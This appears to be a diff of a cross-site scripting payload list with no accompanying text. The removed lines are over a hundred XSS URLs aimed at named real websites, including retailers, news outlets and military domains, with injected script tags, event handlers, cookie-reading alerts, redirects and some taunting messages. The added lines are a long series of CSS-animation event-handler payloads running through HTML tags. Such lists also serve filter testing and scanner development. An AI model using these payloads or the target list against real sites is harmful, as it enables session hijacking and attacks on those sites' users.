-http://www.garethjohnmorgan.com/main.php?title=&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.select-yordan.net/main.php?title=list&amp;name=&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.pbems.net/universomarvel/main.php?title=&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.pbems.net/universomarvel/main.php?article=k-net&amp;search=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.kungfudirect.com/proddetail.asp?prod=%22%3ea%3c/a%3e%3cscript%3ealert(document.cookie);%3<br>c/script%3e&amp;cat=32
-http://www.arcadetown.com/scripts/show_hiscore.asp?gameid=%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e
-http://www.underground-resistance.ej.am/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.youngmodelz.com/arylia-related-main.php?title=&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;id=934
-http://pansotto.momapix.com/index.php?url=ricerca.php&amp;text=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;s=&amp;ricerca=r<br>icerca
-http://farcry.uk.ubi.com/index.php?page=%00&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.lego.com/legostores/features.asp?x=x&amp;store=test&lt;script&gt;alert(1);&lt;/script&gt;&amp;ccode=3
-http://farcry.it.ubi.com/?page=%00&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://farcry.es.ubi.com/?page=%00&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.walmart.com/search/search-ng.do?search_constraint=0&amp;ic=48_0&amp;search_query='<br>onmouseover='alert(1);&amp;find.x=0&amp;find.y=0&amp;find=find
-http://www.bestbuy.com/site/olspage.jsp?id=cat13506&amp;type=page&amp;skuid=9171709&amp;productid=1218043585577&amp;<br>largeimgurl=/images/screenshots/9171/9171709_pchomel_006_ss.jpg&quot;<br>onmouseover%3d&quot;alert(1);&amp;caption=test&amp;count=5&amp;total=6
-http://farcry.de.ubi.com/?page=%00&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://farcry.fr.ubi.com/?page=%00&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://farcry.us.ubi.com/index.php?page=%00&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://w2.military-mayhem.com/registerver.php?ref=&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.spacetrace.org/spacetrace.php?username=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://w1.military-mayhem.com/registerver.php?ref=&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://csc-webserver.caci.com/nsa/new/email_friend.asp?refer_url=%22%3e%3cscript%3ealert(1);%3c/scri<br>pt%3e
-http://www.chosenspace.com/v2.php?page=signup&amp;ref=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--&amp;old_id=
-http://www.colbertnation.com/video?keywords=&lt;/title&gt;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.startrek.com/startrek/view/search/result.html?type=article&amp;search=%22%3e%3c%2fa%3e%3cscri<br>pt%3ealert(%22pappy%20says%3a%20star%20wars%20is%20better%22)%3b%3c%2fscript%3e&amp;category=
-http://www.radioshack.com/uc/index.jsp?page=researchlibraryarticle&amp;articleurl='); alert(1);<br>//&amp;nobc=click on print
-http://www.tmz.com/search/?q=&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;test
-http://shop3.frys.com/search?search_type=regular&amp;sqxts=1&amp;query_string=test&quot;+onmouseover%3d&quot;document.<br>location='http%26%2358//google.com';&amp;cat=0&amp;submit.x=0&amp;submit.y=0
-http://www.sears.com/shc/s/v_10153_12605_health+testicles&quot;;<br>document.location=&quot;\x68\x74\x74\x70\x3a\x2f\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d
-http://www.wolfram.com/emailchange/?email=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;mid=
-http://www.af.mil/shared/widgets/popup.asp?url=&quot;&gt;&lt;/object&gt;&lt;/embed&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.airforce.com/search/?find=&quot;); alert(1); //
-https://secure.airforce.com/contact/index.php?first_nm=&quot;&gt;&lt;script&gt;alert(&quot;are global variables<br>on?&quot;);&lt;/script&gt;&amp;last_nm=&quot;&gt;&lt;script&gt;alert(&quot;oh and btw all your base are belong pappy&quot;);&lt;/script&gt;
-http://www.onelook.com/cgi-bin/cgiwrap/bware/dofind.cgi?word=&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(document.cookie<br>);&lt;/script&gt;
-http://www.gametrailers.com/umlisting.php?list=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://weather.mysanantonio.com/auto/mysanantonio/radar/radblast.asp?zoommode=pan&amp;prevzoom=zoom&amp;num=<br>6&amp;frame=0&amp;delay=15&amp;scale=0.250&amp;noclutter=1&amp;id=ewx&amp;type=n0r&amp;showstorms=0&amp;lat=0&amp;lon=0&amp;label=you&amp;map.x=<br>400&amp;map.y=240&amp;scale=0.250&amp;centerx=586&amp;centery=76&amp;showlabels=1&amp;rainsnow=0&amp;lightning=0&amp;lerror=20&amp;num_s<br>tns_min=2&amp;num_stns_max=9999&amp;avg_off=9999&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.recreation.gov/reservationnavigation.do?action=campground&amp;contractcode=nrso&amp;parkid=375320<br>&amp;statecode=id&amp;areanametobook=&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://support.hardwarezone.com/view.php?e=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;t=&quot;&gt;&lt;script&gt;al<br>ert(document.cookie);&lt;/script&gt;
-http://www.moztips.com/search.php?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.processor.com/listings/forsale/list.asp?guid=f3de8213d2e94912ab2d79983feb52c7&amp;etid=1&amp;part<br>number=&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;partnumx=contains&amp;submit2=search
-http://www.wnd.com/index.php?fa=http://google.com?%3cscript%3ealert(document.cookie);%3c/script%3e&amp;p<br>ageid=1
-http://lonestarwesterndecor.resultspage.com/search?p=q&amp;srid=s9-4&amp;ts=custom&amp;lbc=lonestarwesterndecor&amp;<br>uid=289674918&amp;w=%22%3e%3c%2fa%3e%3cscript%3ealert(document.cookie)%3b%3c%2fscript%3e
-http://sempo.resultspage.com/search?p=q&amp;srid=s7-2&amp;ts=custom&amp;lbc=sempo&amp;uid=289674918&amp;w=%27);%0aalert(<br>document.cookie);//&amp;mainresult=mt_mainresult_yes&amp;section=
-http://americanbridal.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document<br>.cookie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://homemarketplace.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(/hacker<br>%20safe%20my%20ass/);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://nbc.resultspage.com/search?p=q&amp;ts=custom&amp;w=');%0aalert(document.cookie);//&amp;x=0&amp;y=0
-http://easycomforts.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(/hacker%20<br>safe%20my%20ass/);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://mileskimball.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.c<br>ookie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://handmark.resultspage.com/search?p=q&amp;ts=custom&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;x=0&amp;y=0
-http://cbs.resultspage.com/search?p=q&amp;srid=s10-3&amp;ts=custom&amp;lbc=cbs&amp;uid=289674918&amp;w=%27;%3c/script%3e<br>%3cscript%3ealert(document.cookie);//
-http://autoparts.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.cook<br>ie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0
-http://labsafe.resultspage.com/search?p=q&amp;ts=custom&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;y=0
-http://www.cw.com/inc/scripts/search.jsp?qt=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.darkfate.co.uk/main-register.php?ref=&lt;script&gt;alert(1);&lt;/script&gt;
-http://community.hereignsnetwork.com/service/searcheverything.kickaction?keywords=&quot;&gt;&lt;script&gt;alert(1)<br>;&lt;/script&gt;&amp;includevideo=on&amp;includeaudio=on&amp;includephoto=on&amp;includeblog=on&amp;includeuser=on&amp;includegrou<br>ps=on&amp;includemessages=on&amp;as=83239
-http://www.modern-empires.com/network/www/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.channel4.com/apps26/userlogin?code=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;email=&quot;&gt;&lt;script&gt;alert(1);<br>&lt;/script&gt;&amp;formtype=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;confirm&amp;formsuccess=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;/emai<br>l-confirmed.htm
-http://www.delorie.com/web/headers.cgi?url=http://google.com&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://pown.it/wiipown.php?uid=1634'&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-https://secure.wired.com/user/registration?returnto=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.dlrpg.com/signup.php?ref=1&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.aegeanadventures.com/register.php?ref=&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.sportingnews.com/search.php?q=%27);%20alert(1);%20//
-http://www.airtightdesign.com/search/?search=1&amp;query=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;submit_search.x=0&amp;<br>submit_search.y=0
-http://pitstopboss.co.uk/?r=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.foxbaltimore.com/cgi-bin/websrch.pl?keywords=&quot;&gt;&lt;/a&gt;&lt;img src=x onerror=&quot;alert(1)&quot;;&gt;
-http://www.africanethnomedicines.net/ojs2/index.php/&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;font name=&quot;
-http://cadth.ca/index.php/en/search?keywords=test&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.homedepot.ca/webapp/wcs/stores/servlet/catalogsearchresultview?storeid=10051&amp;catalogid=10<br>051&amp;langid=-15&amp;n=0&amp;ntk=level1&amp;ntt=&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;;&gt;&amp;nty=1&amp;d=&quot;&gt;&lt;img src=x<br>onerror=&quot;alert(1)&quot;;&gt;&amp;ntx=mode+matchallpartial&amp;dx=mode+matchallpartial&amp;s=true
-http://www.globalsecurity.org/security/profiles/generate_group_activities.php?name=&quot;&gt;&lt;/a&gt;&lt;img src=x<br>onerror=alert(1);&gt;&lt;iframe src=http://google.com&gt;
-http://www.ridezorcollidez.info/ridezorcollidezgame/ph/index.php?xxx=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script<br>&gt;
-http://www.firstmafiawar.com/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.freemafiagame.com/signup.php?refer=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.gang-force.nl/signup.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://undenial.co.uk/mb/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.otcbb.com/asp/quote_module.asp?symbol=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--
-http://www.2shared.com/search.jsp?start=0&amp;sorttype=1&amp;sortorder=1&amp;searchmode=1&amp;searchname=&quot;&gt;&lt;/a&gt;&lt;scri<br>pt&gt;alert(1);&lt;/script&gt;&amp;x=0&amp;y=0
-http://www.wellingtone.co.uk/candidates-register.php?ref=&lt;/textarea&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;affil<br>iate=mpi
-http://www.efukt.com/sort/0/3/\&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;test/no_result
-http://www.toorgle.com/results.php?cx=009817295251880643908%3amtoxh90yxnq&amp;q=%22%3e%3c%2fobject%3e%3c<br>script%3ealert(1)%3b%3c%2fscript%3e&amp;sa=search+torrent&amp;cof=forid%3a11&amp;security=666
-http://support.clickatell.com/search.php?cx=011385790347605367781:svx4ujrukww&amp;cof=forid:11&amp;ie=utf-8&amp;<br>q='; alert(1); //&amp;sa.x=0&amp;sa.y=0&amp;sa=search#963
-http://www.theroyalmafia.com/signup.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.oppend.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://gangsta-endz.com/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://biz.tigerdirect.com/applications/searchtools/item-details.asp?edpno=4240162&amp;sku=cp1-i7-965&amp;bo<br>dy=';%0a%7d%20%0aalert(1);%0afunction%20testicles()%7bvar%20a='
-http://www.metro.co.uk/email/emailconfirm.html?in_article_id=690958&amp;in_page_id=2--------------------<br>-------------------------------------------------------------------------------------------------%20<br>--&gt;&lt;script&gt;alert('wow xss and possible sql<br>injection');&lt;/script&gt;&lt;!--%20------------------------------------------------------------------------<br>--------------------------------------------
-http://jiffyporn.com/index.php?cat=16'&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.vertica-risk-management.co.uk/register.php?ref=&lt;script&gt;alert(1);&lt;/script&gt;
-http://scrapetorrent.com/search/index.php?search=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;sort=seed&amp;fz=&amp;rd=&amp;cat=<br>x
-http://www.bluenity.fr/?frml=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.coolwhois.com/d/&quot;&gt;&lt;img src=x onerror=&quot;alert(1);&quot;&gt;
-http://sitereview.bluecoat.com/index.jsp?&amp;host='&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;policy=view
-http://www.misco.fr/search/~query~%22+onunload%3d%22alert(1)%22+~/index.htm;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;
-http://search.metro.co.uk/search?q=&quot;&gt;&lt;/title&gt;&lt;img src=x onerror=&quot;alert(1);&quot;&gt;
-http://entertainment.timesonline.co.uk/tol/sitesearch.do?x=0&amp;y=0&amp;query=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;<br>turnoffgoogleads=true&amp;submitstatus=searchformsubmitted&amp;mode=simple&amp;sectionid=980
-http://www.copyscape.com/signup.php?pro=1&amp;o=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.fidofinder.com/lost-dogs.php?citystate=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://search.chow.com/search?query=&amp;advanced=&amp;type=&amp;from_date=10+years+ago&amp;to_date=&quot;&gt;&lt;script&gt;alert(<br>'chow%20on%20these%20nuts!!!!!!!');&lt;/script&gt;&amp;sort_mode=&lt;/title&gt;test
-http://www.bluenity.com/?frml=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.downloadprofessional.com/search.php?a=reactor&amp;q='&gt;&lt;/title&gt;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.co<br>okie);&lt;/script&gt;
-http://www.expo.com/searchresults.aspx?searchterm=&lt;/title&gt;'; &lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-https://commerce.us.reuters.com/login/pages/login/logout.do?go=http://google.com
-http://content.webcollage.net/walmart/educational-content-page?topic=msvista-msv_compare&quot;&gt;&lt;/a&gt;&lt;scrip<br>t&gt;alert(0);&lt;/script&gt;
-http://fineartamerica.com/paintings/tag/&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.bootmafia.net/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.reuters.com/do/emailarticle?articleid=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--
-http://funds.reuters.com/lipper/retail/reuters/fundscreener.asp?type=&quot;;} alert(1);<br>//&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(0);&lt;/script&gt;
-http://www.eworldgenie.com/signup.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.equlibriumrpg.com/signup.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://letsbreakrecords.shiftcode.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://cashmonkiesjr.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.perpetual-traffic.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;src=
-http://www.shopjoy.co.uk/register.php?ref=&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.channelnext.ca/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://cashmonkies.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.ultimatexchange.net/register.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.zoucn.com/signup.php?ref=&quot;'&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.yourwaysurf.com/signup.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;
-http://www.xtremepimp.com/signup.php?ref=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;test
-http://www.weeklytech.com/\&quot;&gt;&lt;marquee&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-http://www.midnightcrime.com/register.php?ref='&gt;&lt;script&gt;alert(1);&lt;/script&gt;
+<style>@keyframes x{}</style><abbr style="animation-name:x" onanimationend="alert(1)"></abbr>
+<style>@keyframes x{}</style><abbr style="animation-name:x" onanimationstart="alert(1)"></abbr>
+<style>@keyframes x{}</style><acronym style="animation-name:x" onanimationend="alert(1)"></acronym>
+<style>@keyframes x{}</style><acronym style="animation-name:x" onanimationstart="alert(1)"></acronym>
+<style>@keyframes x{}</style><address style="animation-name:x" onanimationend="alert(1)"></address>
+<style>@keyframes x{}</style><address style="animation-name:x" onanimationstart="alert(1)"></address>
+<style>@keyframes x{}</style><applet style="animation-name:x" onanimationend="alert(1)"></applet>
+<style>@keyframes x{}</style><applet style="animation-name:x" onanimationstart="alert(1)"></applet>
+<style>@keyframes x{}</style><area style="animation-name:x" onanimationend="alert(1)"></area>
+<style>@keyframes x{}</style><area style="animation-name:x" onanimationstart="alert(1)"></area>
+<style>@keyframes x{}</style><article style="animation-name:x" onanimationend="alert(1)"></article>
+<style>@keyframes x{}</style><article style="animation-name:x" onanimationstart="alert(1)"></article>
+<style>@keyframes x{}</style><aside style="animation-name:x" onanimationend="alert(1)"></aside>
+<style>@keyframes x{}</style><aside style="animation-name:x" onanimationstart="alert(1)"></aside>
+<style>@keyframes x{}</style><audio style="animation-name:x" onanimationend="alert(1)"></audio>
+<style>@keyframes x{}</style><audio style="animation-name:x" onanimationstart="alert(1)"></audio>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationend="alert(1)"></b>
+<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
+<style>@keyframes x{}</style><base style="animation-name:x" onanimationend="alert(1)"></base>
+<style>@keyframes x{}</style><base style="animation-name:x" onanimationstart="alert(1)"></base>
+<style>@keyframes x{}</style><basefont style="animation-name:x" onanimationend="alert(1)"></basefont>
+<style>@keyframes x{}</style><basefont style="animation-name:x" onanimationstart="alert(1)"></basefont>
+<style>@keyframes x{}</style><bdi style="animation-name:x" onanimationend="alert(1)"></bdi>
+<style>@keyframes x{}</style><bdi style="animation-name:x" onanimationstart="alert(1)"></bdi>
+<style>@keyframes x{}</style><bdo style="animation-name:x" onanimationend="alert(1)"></bdo>
+<style>@keyframes x{}</style><bdo style="animation-name:x" onanimationstart="alert(1)"></bdo>
+<style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationend="alert(1)"></bgsound>
+<style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationstart="alert(1)"></bgsound>
+<style>@keyframes x{}</style><big style="animation-name:x" onanimationend="alert(1)"></big>
+<style>@keyframes x{}</style><big style="animation-name:x" onanimationstart="alert(1)"></big>
+<style>@keyframes x{}</style><blink style="animation-name:x" onanimationend="alert(1)"></blink>
+<style>@keyframes x{}</style><blink style="animation-name:x" onanimationstart="alert(1)"></blink>
+<style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationend="alert(1)"></blockquote>
+<style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationstart="alert(1)"></blockquote>
+<style>@keyframes x{}</style><body style="animation-name:x" onanimationend="alert(1)"></body>
+<style>@keyframes x{}</style><body style="animation-name:x" onanimationstart="alert(1)"></body>
+<style>@keyframes x{}</style><br style="animation-name:x" onanimationend="alert(1)"></br>
+<style>@keyframes x{}</style><br style="animation-name:x" onanimationstart="alert(1)"></br>
+<style>@keyframes x{}</style><button style="animation-name:x" onanimationend="alert(1)"></button>
+<style>@keyframes x{}</style><button style="animation-name:x" onanimationstart="alert(1)"></button>
+<style>@keyframes x{}</style><canvas style="animation-name:x" onanimationend="alert(1)"></canvas>
+<style>@keyframes x{}</style><canvas style="animation-name:x" onanimationstart="alert(1)"></canvas>
+<style>@keyframes x{}</style><caption style="animation-name:x" onanimationend="alert(1)"></caption>
+<style>@keyframes x{}</style><caption style="animation-name:x" onanimationstart="alert(1)"></caption>
+<style>@keyframes x{}</style><center style="animation-name:x" onanimationend="alert(1)"></center>
+<style>@keyframes x{}</style><center style="animation-name:x" onanimationstart="alert(1)"></center>
+<style>@keyframes x{}</style><cite style="animation-name:x" onanimationend="alert(1)"></cite>
+<style>@keyframes x{}</style><cite style="animation-name:x" onanimationstart="alert(1)"></cite>
+<style>@keyframes x{}</style><code style="animation-name:x" onanimationend="alert(1)"></code>
+<style>@keyframes x{}</style><code style="animation-name:x" onanimationstart="alert(1)"></code>
+<style>@keyframes x{}</style><col style="animation-name:x" onanimationend="alert(1)"></col>
+<style>@keyframes x{}</style><col style="animation-name:x" onanimationstart="alert(1)"></col>
+<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationend="alert(1)"></colgroup>
+<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationstart="alert(1)"></colgroup>
+<style>@keyframes x{}</style><command style="animation-name:x" onanimationend="alert(1)"></command>
+<style>@keyframes x{}</style><command style="animation-name:x" onanimationstart="alert(1)"></command>
+<style>@keyframes x{}</style><content style="animation-name:x" onanimationend="alert(1)"></content>
+<style>@keyframes x{}</style><content style="animation-name:x" onanimationstart="alert(1)"></content>
+<style>@keyframes x{}</style><data style="animation-name:x" onanimationend="alert(1)"></data>
+<style>@keyframes x{}</style><data style="animation-name:x" onanimationstart="alert(1)"></data>
+<style>@keyframes x{}</style><datalist style="animation-name:x" onanimationend="alert(1)"></datalist>
+<style>@keyframes x{}</style><datalist style="animation-name:x" onanimationstart="alert(1)"></datalist>
+<style>@keyframes x{}</style><dd style="animation-name:x" onanimationend="alert(1)"></dd>
+<style>@keyframes x{}</style><dd style="animation-name:x" onanimationstart="alert(1)"></dd>
+<style>@keyframes x{}</style><del style="animation-name:x" onanimationend="alert(1)"></del>
+<style>@keyframes x{}</style><del style="animation-name:x" onanimationstart="alert(1)"></del>
+<style>@keyframes x{}</style><details style="animation-name:x" onanimationend="alert(1)"></details>
+<style>@keyframes x{}</style><details style="animation-name:x" onanimationstart="alert(1)"></details>
+<style>@keyframes x{}</style><dfn style="animation-name:x" onanimationend="alert(1)"></dfn>
+<style>@keyframes x{}</style><dfn style="animation-name:x" onanimationstart="alert(1)"></dfn>
+<style>@keyframes x{}</style><dialog style="animation-name:x" onanimationend="alert(1)"></dialog>
+<style>@keyframes x{}</style><dialog style="animation-name:x" onanimationstart="alert(1)"></dialog>
+<style>@keyframes x{}</style><dir style="animation-name:x" onanimationend="alert(1)"></dir>
+<style>@keyframes x{}</style><dir style="animation-name:x" onanimationstart="alert(1)"></dir>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(1)"></div>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+<style>@keyframes x{}</style><dl style="animation-name:x" onanimationend="alert(1)"></dl>
+<style>@keyframes x{}</style><dl style="animation-name:x" onanimationstart="alert(1)"></dl>
+<style>@keyframes x{}</style><dt style="animation-name:x" onanimationend="alert(1)"></dt>
+<style>@keyframes x{}</style><dt style="animation-name:x" onanimationstart="alert(1)"></dt>
+<style>@keyframes x{}</style><element style="animation-name:x" onanimationend="alert(1)"></element>
+<style>@keyframes x{}</style><element style="animation-name:x" onanimationstart="alert(1)"></element>
+<style>@keyframes x{}</style><em style="animation-name:x" onanimationend="alert(1)"></em>
+<style>@keyframes x{}</style><em style="animation-name:x" onanimationstart="alert(1)"></em>
+<style>@keyframes x{}</style><embed style="animation-name:x" onanimationend="alert(1)"></embed>
+<style>@keyframes x{}</style><embed style="animation-name:x" onanimationstart="alert(1)"></embed>
+<style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationend="alert(1)"></fieldset>
+<style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationstart="alert(1)"></fieldset>
+<style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationend="alert(1)"></figcaption>
+<style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationstart="alert(1)"></figcaption>
+<style>@keyframes x{}</style><figure style="animation-name:x" onanimationend="alert(1)"></figure>
+<style>@keyframes x{}</style><figure style="animation-name:x" onanimationstart="alert(1)"></figure>
+<style>@keyframes x{}</style><font style="animation-name:x" onanimationend="alert(1)"></font>
+<style>@keyframes x{}</style><font style="animation-name:x" onanimationstart="alert(1)"></font>
+<style>@keyframes x{}</style><footer style="animation-name:x" onanimationend="alert(1)"></footer>
+<style>@keyframes x{}</style><footer style="animation-name:x" onanimationstart="alert(1)"></footer>
+<style>@keyframes x{}</style><form style="animation-name:x" onanimationend="alert(1)"></form>
+<style>@keyframes x{}</style><form style="animation-name:x" onanimationstart="alert(1)"></form>
+<style>@keyframes x{}</style><frame style="animation-name:x" onanimationend="alert(1)"></frame>
+<style>@keyframes x{}</style><frame style="animation-name:x" onanimationstart="alert(1)"></frame>
+<style>@keyframes x{}</style><frameset style="animation-name:x" onanimationend="alert(1)"></frameset>
+<style>@keyframes x{}</style><frameset style="animation-name:x" onanimationstart="alert(1)"></frameset>
+<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationend="alert(1)"></h1>
+<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationstart="alert(1)"></h1>
+<style>@keyframes x{}</style><head style="animation-name:x" onanimationend="alert(1)"></head>
+<style>@keyframes x{}</style><head style="animation-name:x" onanimationstart="alert(1)"></head>
+<style>@keyframes x{}</style><header style="animation-name:x" onanimationend="alert(1)"></header>
+<style>@keyframes x{}</style><header style="animation-name:x" onanimationstart="alert(1)"></header>
+<style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationend="alert(1)"></hgroup>
+<style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationstart="alert(1)"></hgroup>
+<style>@keyframes x{}</style><hr style="animation-name:x" onanimationend="alert(1)"></hr>
+<style>@keyframes x{}</style><hr style="animation-name:x" onanimationstart="alert(1)"></hr>
+<style>@keyframes x{}</style><html style="animation-name:x" onanimationend="alert(1)"></html>
+<style>@keyframes x{}</style><html style="animation-name:x" onanimationstart="alert(1)"></html>
+<style>@keyframes x{}</style><i style="animation-name:x" onanimationend="alert(1)"></i>
+<style>@keyframes x{}</style><i style="animation-name:x" onanimationstart="alert(1)"></i>
+<style>@keyframes x{}</style><iframe style="animation-name:x" onanimationend="alert(1)"></iframe>
+<style>@keyframes x{}</style><iframe style="animation-name:x" onanimationstart="alert(1)"></iframe>
+<style>@keyframes x{}</style><image style="animation-name:x" onanimationend="alert(1)"></image>
+<style>@keyframes x{}</style><image style="animation-name:x" onanimationstart="alert(1)"></image>
+<style>@keyframes x{}</style><img style="animation-name:x" onanimationend="alert(1)"></img>
+<style>@keyframes x{}</style><img style="animation-name:x" onanimationstart="alert(1)"></img>
+<style>@keyframes x{}</style><input style="animation-name:x" onanimationend="alert(1)"></input>
+<style>@keyframes x{}</style><input style="animation-name:x" onanimationstart="alert(1)"></input>
+<style>@keyframes x{}</style><ins style="animation-name:x" onanimationend="alert(1)"></ins>
+<style>@keyframes x{}</style><ins style="animation-name:x" onanimationstart="alert(1)"></ins>
+<style>@keyframes x{}</style><isindex style="animation-name:x" onanimationend="alert(1)"></isindex>
